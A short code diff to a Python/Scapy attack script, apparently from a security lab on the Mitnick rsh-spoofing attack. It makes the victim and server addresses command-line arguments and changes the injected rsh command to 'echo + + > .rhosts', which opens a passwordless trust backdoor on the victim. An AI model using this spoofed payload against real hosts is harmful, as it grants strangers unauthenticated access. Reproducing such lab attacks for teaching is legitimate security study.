@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# 04/03/2021
+# 05/03/2021
 
 # Authors
 # =======
@@ -21,17 +21,17 @@
 from scapy.all import *
 import time
 from random import randint
+import sys
 
-x_ip = "10.0.2.8"		# Victim's IP address
-x_port = 514			# Victim's port number
-
-srv_ip = "10.0.2.15" 	# Server's IP address
+x_ip = sys.argv[1]      # Victim's IP address
+srv_ip = sys.argv[2]    # Server's IP address		
+x_port = 514			# Victim's port number 	
 srv_port = 1023		 	# Server's port number
 
 sequence = 778933536 	# 32 bit sequence number in TCP header
 
 # Payload: "port\x00client_username\x00server_username\x00command\x00"
-data = "1022\x00seed\x00seed\x00touch /tmp/xyz\x00"
+data = "1022\x00seed\x00seed\x00echo + + > .rhosts\x00"
 
 # send_SYN sends a synchronise packet to initiate TCP handshake
 
